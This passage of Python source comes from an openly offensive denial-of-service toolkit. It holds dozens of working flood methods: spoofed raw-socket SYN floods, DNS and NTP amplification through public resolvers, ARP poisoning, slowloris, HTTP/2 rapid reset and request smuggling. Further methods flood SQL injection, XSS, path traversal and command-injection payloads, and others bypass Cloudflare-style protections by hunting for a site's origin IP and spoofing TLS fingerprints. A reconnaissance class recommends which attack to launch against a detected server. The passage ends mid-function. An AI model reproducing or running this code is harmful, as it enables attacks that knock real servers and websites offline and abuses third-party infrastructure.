            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def ntp_monlist_flood(target_ip, threads=3000):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ntp_monlist = b'\x17\x00\x03\x2a' + b'\x00' * 44
            ntp_servers = ['pool.ntp.org', 'time.google.com', 'time.windows.com', '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org']
            while not stop_attack.is_set():
                try:
                    ntp_server = random.choice(ntp_servers)
                    sock.sendto(ntp_monlist, (ntp_server, 123))
                    update_stats(sent=1, method="ntp_monlist")
                except:
                    update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def dns_amplification(target_ip, threads=3000):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_servers = ['8.8.8.8', '1.1.1.1', '8.8.4.4', '208.67.222.222', '208.67.220.220', '9.9.9.9', '94.140.14.14', '76.76.19.19']
            domains = ['google.com', 'facebook.com', 'youtube.com', 'amazon.com', 'microsoft.com', 'apple.com', 'netflix.com', 'twitter.com']
            while not stop_attack.is_set():
                try:
                    dns_server = random.choice(dns_servers)
                    domain = random.choice(domains)
                    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + len(domain).to_bytes(1, 'big') + domain.encode() + b'\x00\x00\x01\x00\x01'
                    sock.sendto(query, (dns_server, 53))
                    update_stats(sent=1, method="dns_amp")
                except:
                    update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def arp_poisoning(target_ip, target_mac=None, threads=500):
        def worker():
            try:
                from scapy.all import ARP, send
                while not stop_attack.is_set():
                    arp_packet = ARP(op=2, psrc=target_ip, hwdst=target_mac if target_mac else 'ff:ff:ff:ff:ff:ff')
                    send(arp_packet, verbose=False)
                    update_stats(sent=1, method="arp_poison")
            except:
                update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS // 10)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def all_server_combined(target_ip, target_port):
        methods = [
            (ServerAttackMethods.udp_flood_server, (target_ip, target_port, 300)),
            (ServerAttackMethods.syn_flood_server, (target_ip, target_port, 300)),
            (ServerAttackMethods.connection_exhaustion, (target_ip, target_port, 300)),
            (ServerAttackMethods.amp_ddos_server, (target_ip, target_port, 200)),
            (ServerAttackMethods.slow_loris_server, (target_ip, target_port, 300)),
            (ServerAttackMethods.game_ping_flood, (target_ip, target_port, 200)),
            (ServerAttackMethods.ssl_exhaustion_server, (target_ip, target_port, 200)),
            (ServerAttackMethods.icmp_flood_server, (target_ip, 200)),
            (ServerAttackMethods.tcp_rst_flood, (target_ip, target_port, 200)),
            (ServerAttackMethods.ntp_monlist_flood, (target_ip, 200)),
            (ServerAttackMethods.dns_amplification, (target_ip, 200)),
        ]
        for method, args in methods:
            try:
                threading.Thread(target=method, args=args, daemon=True).start()
            except:
                pass
# ================================ SERVER AUTO-DETECTION ================================

class ServerAutoDetection:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.server_type = "Unknown"
        self.open_ports = []
        self.response_time = 0
        self.banner_info = None
        self.protocol = None
        
    def detect_server_type(self):
        print(f"{Fore.YELLOW}[*] Detecting server type...{Style.RESET_ALL}")
        if self.target_port in GAME_SERVER_PORTS:
            self.server_type = GAME_SERVER_PORTS[self.target_port]["name"]
            self.protocol = GAME_SERVER_PORTS[self.target_port]["protocol"]
            print(f"  {Fore.RED}[!] Game Server Detected: {self.server_type} (Protocol: {self.protocol}){Style.RESET_ALL}")
        elif self.target_port == 443:
            self.server_type = "HTTPS/SSL Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] SSL Server Detected{Style.RESET_ALL}")
        elif self.target_port == 80:
            self.server_type = "HTTP Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] HTTP Server Detected{Style.RESET_ALL}")
        elif self.target_port == 22:
            self.server_type = "SSH Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] SSH Server Detected{Style.RESET_ALL}")
        elif self.target_port == 3306:
            self.server_type = "MySQL Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] MySQL Server Detected{Style.RESET_ALL}")
        elif self.target_port == 5432:
            self.server_type = "PostgreSQL Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] PostgreSQL Server Detected{Style.RESET_ALL}")
        elif self.target_port == 6379:
            self.server_type = "Redis Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] Redis Server Detected{Style.RESET_ALL}")
        elif self.target_port == 27017:
            self.server_type = "MongoDB Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] MongoDB Server Detected{Style.RESET_ALL}")
        elif self.target_port == 8080:
            self.server_type = "Proxy/Web Server"
            self.protocol = "TCP"
            print(f"  {Fore.YELLOW}[!] Proxy/Web Server Detected{Style.RESET_ALL}")
        else:
            print(f"  {Fore.CYAN}[+] Port {self.target_port} - Unknown server type{Style.RESET_ALL}")
        return self.server_type
    
    def grab_banner(self):
        print(f"{Fore.YELLOW}[*] Grabbing banner...{Style.RESET_ALL}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target_ip, self.target_port))
            if self.target_port in [80, 443, 8080, 8443]:
                sock.send(b"HEAD / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
            elif self.target_port in [22, 3306, 5432, 6379, 27017]:
                sock.send(b"\r\n")
            banner = sock.recv(512).decode('utf-8', errors='ignore')
            self.banner_info = banner[:200]
            sock.close()
            if self.banner_info:
                print(f"  {Fore.GREEN}[+] Banner: {self.banner_info[:100]}{Style.RESET_ALL}")
        except:
            pass
        return self.banner_info
    
    def scan_ports(self):
        print(f"{Fore.YELLOW}[*] Scanning additional ports...{Style.RESET_ALL}")
        common_ports = [22, 80, 443, 3306, 5432, 6379, 27017, 8080, 8443, 27015, 27016, 25565, 19132, 7777, 28015, 9987]
        for port in common_ports:
            if port == self.target_port:
                continue
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((self.target_ip, port)) == 0:
                    self.open_ports.append(port)
                    print(f"  {Fore.GREEN}[+] Port {port} open{Style.RESET_ALL}")
                sock.close()
            except:
                pass
        return self.open_ports
    
    def test_response_time(self):
        print(f"{Fore.YELLOW}[*] Testing server response time...{Style.RESET_ALL}")
        times = []
        for _ in range(5):
            try:
                start = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                times.append(time.time() - start)
                sock.close()
            except:
                pass
            time.sleep(0.5)
        self.response_time = sum(times) / len(times) if times else 1.0
        print(f"  {Fore.CYAN}Response: {self.response_time*1000:.0f}ms{Style.RESET_ALL}")
        return self.response_time
    
    def generate_recommendations(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] SERVER ATTACK RECOMMENDATIONS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        recs = []
        if "Mobile Legends" in self.server_type:
            recs.append(('game', 'Game Server Ping Flood', 'Mobile Legends detected - UDP flood with specific payloads', min(5000, MAX_THREADS), 60))
        if "Minecraft" in self.server_type:
            recs.append(('conn', 'Connection Exhaustion', 'Minecraft server - keep connections open', min(8000, MAX_THREADS), 60))
        if self.protocol == "UDP":
            recs.append(('udp', 'UDP Flood', 'UDP protocol detected - packet flooding', min(5000, MAX_THREADS), 60))
        if self.protocol == "TCP":
            recs.append(('syn', 'SYN Flood', 'TCP protocol detected - handshake exhaustion', min(5000, MAX_THREADS), 60))
        if self.response_time > 0.5:
            recs.append(('slow', 'Slow Loris', f'High response time ({self.response_time*1000:.0f}ms) - slow connection attack', min(5000, MAX_THREADS), 60))
        
        recs.append(('amp', 'Amplification DDoS', 'DNS/NTP/SSDP amplification attack', min(3000, MAX_THREADS), 60))
        recs.append(('ssl', 'SSL Exhaustion', 'SSL/TLS crypto exhaustion', min(3000, MAX_THREADS), 60))
        recs.append(('icmp', 'ICMP Flood', 'Ping flood attack', min(3000, MAX_THREADS), 60))
        recs.append(('rst', 'TCP RST Flood', 'Reset packet flood', min(4000, MAX_THREADS), 60))
        recs.append(('ntp', 'NTP Monlist Flood', 'NTP amplification attack', min(3000, MAX_THREADS), 60))
        recs.append(('dns', 'DNS Amplification', 'DNS reflection attack', min(3000, MAX_THREADS), 60))
        recs.append(('all', 'ALL SERVER METHODS', 'Maximum pressure - 15 attack vectors simultaneously', 0, 90))
        
        for i, (mid, name, reason, thr, dur) in enumerate(recs[:6], 1):
            print(f"{Fore.CYAN}[{i}] {name} (ID: {mid}){Style.RESET_ALL}")
            print(f"    {Fore.YELLOW}→ {reason}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}→ Threads={thr}, Duration={dur}s{Style.RESET_ALL}\n")
        return recs
    
    def full_scan(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] SERVER AUTO-DETECTION ACTIVE")
        print(f"[*] Target: {self.target_ip}:{self.target_port}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        self.detect_server_type()
        self.grab_banner()
        self.scan_ports()
        self.test_response_time()
        recs = self.generate_recommendations()
        print(f"{Fore.CYAN}{'='*60}")
        print(f"[+] SERVER SCAN COMPLETE")
        print(f"    Type: {self.server_type}")
        print(f"    Protocol: {self.protocol or 'Unknown'}")
        print(f"    Open Ports: {self.open_ports if self.open_ports else 'None'}")
        print(f"    Response: {self.response_time*1000:.0f}ms")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        return recs

# ================================ WEBSITE ATTACK METHODS (20 METHODS) ================================

class WebsiteAttackMethods:
    @staticmethod
    def http2_rapid_reset(target_url, threads=1500):
        def worker():
            while not stop_attack.is_set():
                try:
                    host = target_url.split('/')[2]
                    conn = http.client.HTTPSConnection(host, timeout=3)
                    for _ in range(50):
                        if stop_attack.is_set():
                            break
                        conn.request("GET", f"/?{random.randint(0,999999)}", headers={'User-Agent': get_random_ua()})
                    conn.close()
                    update_stats(sent=50, method="http2")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def slowloris_advanced(target_host, target_port=80, threads=3000):
        def worker():
            socks = []
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target_host, target_port))
                    sock.send(f"GET /{random.randint(0,999999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {target_host}\r\n".encode())
                    sock.send(f"User-Agent: {get_random_ua()}\r\n".encode())
                    sock.send("Connection: keep-alive\r\n".encode())
                    socks.append(sock)
                    update_stats(sent=1, method="slowloris")
                except:
                    update_stats(error=True)
                for s in socks[:]:
                    try:
                        s.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
                    except:
                        if s in socks:
                            socks.remove(s)
                time.sleep(random.uniform(3, 8))
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def syn_flood(target_host, target_port=80, threads=5000):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                dest_ip = socket.gethostbyname(target_host)
                while not stop_attack.is_set():
                    source_ip = get_random_ip()
                    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 1500, 0, 64, 6, 0,
                                           socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
                    tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port,
                                           random.randint(1, 4294967295), 0, 5, 2, 8192, 0, 0)
                    sock.sendto(ip_header + tcp_header, (dest_ip, 0))
                    update_stats(sent=1, method="syn_flood")
            except:
                while not stop_attack.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((target_host, target_port))
                        s.close()
                        update_stats(sent=1, method="syn_flood")
                    except:
                        update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def udp_amplification(target_host, threads=3000):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop_attack.is_set():
                try:
                    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x03www\x07' + target_host.encode() + b'\x00\x00\x01\x00\x01'
                    sock.sendto(query, ('8.8.8.8', 53))
                    update_stats(sent=1, method="udp_amp")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def ssl_renegotiation(target_host, target_port=443, threads=1500):
        def worker():
            while not stop_attack.is_set():
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                    ssl_sock.connect((target_host, target_port))
                    for _ in range(50):
                        if stop_attack.is_set():
                            break
                        ssl_sock.send(b'R' * 16384)
                        update_stats(sent=1, bytes_sent=16384, method="ssl_reneg")
                    ssl_sock.close()
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def websocket_flood(target_ws_url, threads=1500):
        def worker():
            while not stop_attack.is_set():
                try:
                    ws = websocket.WebSocket()
                    ws.connect(target_ws_url, timeout=5)
                    for _ in range(100):
                        if stop_attack.is_set():
                            break
                        ws.send('X' * 5000)
                        update_stats(sent=1, bytes_sent=5000, method="websocket")
                    ws.close()
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def graphql_depth(target_url, threads=1500):
        payload = "query { " + " ".join([f"f{i}: __typename" for i in range(500)]) + " }"
        def worker():
            while not stop_attack.is_set():
                try:
                    requests.post(target_url + "/graphql", json={"query": payload * 50}, headers=get_random_headers(), timeout=3)
                    update_stats(sent=1, method="graphql")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def range_dos(target_url, threads=3000):
        def worker():
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    ranges = [f"bytes={i}-{i+99}" for i in range(0, 100000, 100)]
                    headers['Range'] = ', '.join(ranges[:100])
                    requests.get(target_url, headers=headers, timeout=3)
                    update_stats(sent=1, method="range_dos")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http_pipeline(target_host, target_port=80, threads=3000):
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target_host, target_port))
                    pipeline = "".join([f"GET /{i} HTTP/1.1\r\nHost: {target_host}\r\n\r\n" for i in range(500)])
                    sock.send(pipeline.encode())
                    update_stats(sent=500, method="pipeline")
                    sock.close()
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def json_bomb(target_url, threads=1500):
        bomb = json.dumps({str(i): {} for i in range(5000)})
        def worker():
            while not stop_attack.is_set():
                try:
                    requests.post(target_url, json={"data": bomb}, headers=get_random_headers(), timeout=3)
                    update_stats(sent=1, method="json_bomb")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http_smuggling(target_host, target_port=80, threads=2000):
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target_host, target_port))
                    payload = f"POST / HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
                    sock.send(payload.encode())
                    update_stats(sent=1, method="smuggling")
                    sock.close()
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http2_stream_reset(target_url, threads=2000):
        def worker():
            while not stop_attack.is_set():
                try:
                    host = target_url.split('/')[2]
                    conn = http.client.HTTPSConnection(host, timeout=3)
                    for _ in range(100):
                        conn.request("GET", f"/{random.randint(0,999999)}", headers={'User-Agent': get_random_ua()})
                        conn.close()
                    update_stats(sent=100, method="http2_stream")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http_cache_poison(target_url, threads=1500):
        def worker():
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    headers['X-Forwarded-Host'] = 'attacker.com'
                    headers['X-Original-URL'] = '/admin'
                    requests.get(target_url, headers=headers, timeout=3)
                    update_stats(sent=1, method="cache_poison")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http_method_override(target_url, threads=1500):
        methods = ['HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE', 'CONNECT']
        def worker():
            while not stop_attack.is_set():
                try:
                    method = random.choice(methods)
                    headers = get_random_headers()
                    headers['X-HTTP-Method-Override'] = method
                    requests.get(target_url, headers=headers, timeout=3)
                    update_stats(sent=1, method="method_override")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def sql_injection_flood(target_url, threads=1500):
        payloads = PayloadGenerator.sql_injection_payloads()
        def worker():
            while not stop_attack.is_set():
                try:
                    payload = random.choice(payloads)
                    requests.get(target_url, params={'id': payload, 'user': payload, 'search': payload}, headers=get_random_headers(), timeout=3)
                    update_stats(sent=1, method="sql_injection")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def xss_flood(target_url, threads=1500):
        payloads = PayloadGenerator.xss_payloads()
        def worker():
            while not stop_attack.is_set():
                try:
                    payload = random.choice(payloads)
                    requests.post(target_url, data={'comment': payload, 'name': payload, 'message': payload}, headers=get_random_headers(), timeout=3)
                    update_stats(sent=1, method="xss_flood")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def path_traversal_flood(target_url, threads=1500):
        payloads = PayloadGenerator.path_traversal_payloads()
        def worker():
            while not stop_attack.is_set():
                try:
                    payload = random.choice(payloads)
                    requests.get(target_url, params={'file': payload, 'page': payload, 'path': payload}, headers=get_random_headers(), timeout=3)
                    update_stats(sent=1, method="path_traversal")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def rce_flood(target_url, threads=1000):
        payloads = PayloadGenerator.rce_payloads()
        def worker():
            while not stop_attack.is_set():
                try:
                    payload = random.choice(payloads)
                    requests.get(target_url, params={'cmd': payload, 'exec': payload, 'command': payload}, headers=get_random_headers(), timeout=3)
                    update_stats(sent=1, method="rce_flood")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def all_website_combined(target_url, target_host, target_port):
        methods = [
            (WebsiteAttackMethods.http2_rapid_reset, (target_url, 200)),
            (WebsiteAttackMethods.slowloris_advanced, (target_host, target_port, 200)),
            (WebsiteAttackMethods.udp_amplification, (target_host, 100)),
            (WebsiteAttackMethods.ssl_renegotiation, (target_host, target_port, 150)),
            (WebsiteAttackMethods.range_dos, (target_url, 150)),
            (WebsiteAttackMethods.http_pipeline, (target_host, target_port, 150)),
            (WebsiteAttackMethods.json_bomb, (target_url, 100)),
            (WebsiteAttackMethods.http2_stream_reset, (target_url, 100)),
            (WebsiteAttackMethods.http_cache_poison, (target_url, 100)),
            (WebsiteAttackMethods.sql_injection_flood, (target_url, 100)),
            (WebsiteAttackMethods.xss_flood, (target_url, 100)),
        ]
        for method, args in methods:
            try:
                threading.Thread(target=method, args=args, daemon=True).start()
            except:
                pass

# ================================ WEBSITE BYPASS METHODS ================================

class WebsiteBypass:
    @staticmethod
    def curl_cffi_impersonate(target_url, threads=1500):
        def worker():
            while not stop_attack.is_set():
                try:
                    r = curl_requests.get(target_url, impersonate="chrome124", timeout=15, verify=False)
                    update_stats(sent=1, bytes_sent=len(r.content), method="curl_cffi")
                    time.sleep(0.05)
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def acme_path_bypass(target_url, threads=1000):
        def worker():
            while not stop_attack.is_set():
                try:
                    token = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
                    requests.get(f"{target_url.rstrip('/')}/.well-known/acme-challenge/{token}", headers=get_random_headers(), timeout=5)
                    update_stats(sent=1, method="acme_bypass")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def origin_direct_attack(origin_ip, target_port=443, threads=5000):
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((origin_ip, target_port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {origin_ip}\r\n\r\n".encode())
                    sock.close()
                    update_stats(sent=1, method="origin_direct")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def ip_spoofing(target_ip, target_port=443, threads=4000):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                while not stop_attack.is_set():
                    source_ip = get_random_ip()
                    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 1500, 0, 64, 6, 0,
                                           socket.inet_aton(source_ip), socket.inet_aton(target_ip))
                    tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port,
                                           random.randint(1, 4294967295), 0, 5, 2, 8192, 0, 0)
                    sock.sendto(ip_header + tcp_header, (target_ip, 0))
                    update_stats(sent=1, method="ip_spoofing")
            except:
                while not stop_attack.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((target_ip, target_port))
                        s.close()
                        update_stats(sent=1, method="ip_spoofing")
                    except:
                        update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def port_hopping(target_host, target_port=443, threads=3000):
        def worker():
            while not stop_attack.is_set():
                try:
                    port = random.randint(1, 65535)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target_host, port))
                    sock.send(b'X' * 512)
                    sock.close()
                    update_stats(sent=1, method="port_hopping")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def tls_fingerprint_bypass(target_url, threads=1000):
        def worker():
            while not stop_attack.is_set():
                try:
                    session = cloudscraper.create_scraper(interpreter='js', delay=8, browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
                    session.get(target_url, timeout=15)
                    update_stats(sent=1, method="tls_fingerprint")
                except:
                    update_stats(error=True)
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=worker, daemon=True).start()
# ================================ WEBSITE AUTO-DETECTION ================================

class WebsiteAutoDetection:
    def __init__(self, target_url, target_host, target_port):
        self.target_url = target_url
        self.target_host = target_host
        self.target_port = target_port
        self.waf_type = None
        self.cdn_type = None
        self.rate_limited = False
        self.ssl_available = False
        self.origin_ip = None
        self.technologies = []
        self.response_time = 0
        self.vulnerabilities = []
        
    def detect_waf_cdn(self):
        print(f"{Fore.YELLOW}[*] Analyzing WAF/CDN...{Style.RESET_ALL}")
        try:
            session = requests.Session()
            session.headers.update(get_random_headers(bypass_level="maximum"))
            resp = session.get(self.target_url, timeout=15, verify=False, allow_redirects=True)
            headers = resp.headers
            html = resp.text.lower()
            
            # Cloudflare detection
            cf_signatures = ['CF-RAY', 'cf-ray', 'cloudflare', '__cfduid', 'cf_clearance', 'cf-chl-challenge']
            for sig in cf_signatures:
                if sig in headers or sig.lower() in str(headers).lower():
                    self.waf_type = "cloudflare"
                    self.cdn_type = "cloudflare"
                    print(f"  {Fore.RED}[!] Cloudflare WAF/CDN Detected{Style.RESET_ALL}")
                    break
            
            # Akamai detection
            if not self.waf_type:
                akamai_signatures = ['AkamaiGHost', 'X-Akamai-Transformed', 'X-Akamai-Request-ID']
                for sig in akamai_signatures:
                    if sig in headers:
                        self.waf_type = "akamai"
                        self.cdn_type = "akamai"
                        print(f"  {Fore.YELLOW}[!] Akamai Detected{Style.RESET_ALL}")
                        break
            
            # Imperva/Incapsula detection
            if not self.waf_type:
                imperva_signatures = ['X-Conditional-Request', 'X-Iinfo', 'Incapsula']
                for sig in imperva_signatures:
                    if sig in headers:
                        self.waf_type = "imperva"
                        self.cdn_type = "incapsula"
                        print(f"  {Fore.YELLOW}[!] Imperva/Incapsula Detected{Style.RESET_ALL}")
                        break
            
            # Sucuri detection
            if not self.waf_type:
                sucuri_signatures = ['X-Sucuri-ID', 'X-Sucuri-Cache']
                for sig in sucuri_signatures:
                    if sig in headers:
                        self.waf_type = "sucuri"
                        self.cdn_type = "sucuri"
                        print(f"  {Fore.YELLOW}[!] Sucuri Detected{Style.RESET_ALL}")
                        break
            
            # AWS WAF detection
            if not self.waf_type:
                aws_signatures = ['x-amzn-RequestId', 'AWSALB']
                for sig in aws_signatures:
                    if sig in headers:
                        self.waf_type = "aws_waf"
                        self.cdn_type = "aws"
                        print(f"  {Fore.YELLOW}[!] AWS WAF Detected{Style.RESET_ALL}")
                        break
            
            if not self.waf_type:
                print(f"  {Fore.GREEN}[✓] No WAF/CDN detected{Style.RESET_ALL}")
                self.waf_type = "none"
                
        except Exception as e:
            print(f"  {Fore.RED}[!] WAF detection failed: {str(e)[:50]}{Style.RESET_ALL}")
        
        return self.waf_type
    
    def discover_origin_ip(self):
        print(f"{Fore.YELLOW}[*] Discovering origin IP...{Style.RESET_ALL}")
        origin_ips = set()
        
        # Method 1: DNS subdomain enumeration
        subdomains = ['www', 'mail', 'ftp', 'admin', 'dev', 'staging', 'api', 'origin', 'direct', 'backend', 'cpanel', 'webmail', 'ns1', 'ns2', 'smtp', 'pop3', 'imap', 'vps', 'server', 'host', 'panel', 'cp', 'control', 'dns', 'mx', 'ns', 'ip']
        
        for sub in subdomains:
            try:
                answers = dns.resolver.resolve(f"{sub}.{self.target_host}", 'A')
                for rdata in answers:
                    ip = str(rdata)
                    # Filter out Cloudflare IPs
                    if not (ip.startswith('104.16.') or ip.startswith('104.17.') or ip.startswith('104.18.') or 
                           ip.startswith('104.19.') or ip.startswith('104.20.') or ip.startswith('104.21.') or
                           ip.startswith('104.22.') or ip.startswith('104.23.') or ip.startswith('104.24.') or
                           ip.startswith('172.64.') or ip.startswith('172.65.') or ip.startswith('172.66.') or
                           ip.startswith('188.114.') or ip.startswith('188.115.') or ip.startswith('188.116.')):
                        origin_ips.add(ip)
                        print(f"  {Fore.GREEN}[+] Found via {sub}: {ip}{Style.RESET_ALL}")
            except:
                pass
        
        # Method 2: SSL certificate analysis
        if self.target_port == 443 or self.target_url.startswith('https'):
            try:
                cert_data = ssl.get_server_certificate((self.target_host, 443))
                # Extract alt names
                import re
                alt_names = re.findall(r'DNS:(.*?)(?:,|$)', cert_data)
                for alt in alt_names:
                    if alt != self.target_host and '*' not in alt:
                        try:
                            alt_ips = dns.resolver.resolve(alt, 'A')
                            for aip in alt_ips:
                                ip = str(aip)
                                if not ip.startswith('104.') and not ip.startswith('172.') and not ip.startswith('188.'):
                                    origin_ips.add(ip)
                                    print(f"  {Fore.GREEN}[+] Found via SSL alt name {alt}: {ip}{Style.RESET_ALL}")
                        except:
                            pass
            except:
                pass
        
        if origin_ips:
            self.origin_ip = list(origin_ips)[0]
            print(f"  {Fore.GREEN}[✓] Origin IP discovered: {self.origin_ip}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[!] Origin IP not discovered (behind Cloudflare){Style.RESET_ALL}")
        
        return self.origin_ip
    
    def detect_rate_limiting(self):
        print(f"{Fore.YELLOW}[*] Testing rate limiting...{Style.RESET_ALL}")
        blocked = 0
        status_codes = []
        
        for i in range(30):
            try:
                resp = requests.get(self.target_url, timeout=5, verify=False)
                status_codes.append(resp.status_code)
                if resp.status_code in [429, 403, 503, 401, 402]:
                    blocked += 1
                time.sleep(0.1)
            except:
                blocked += 1
        
        self.rate_limited = blocked >= 15
        
        if self.rate_limited:
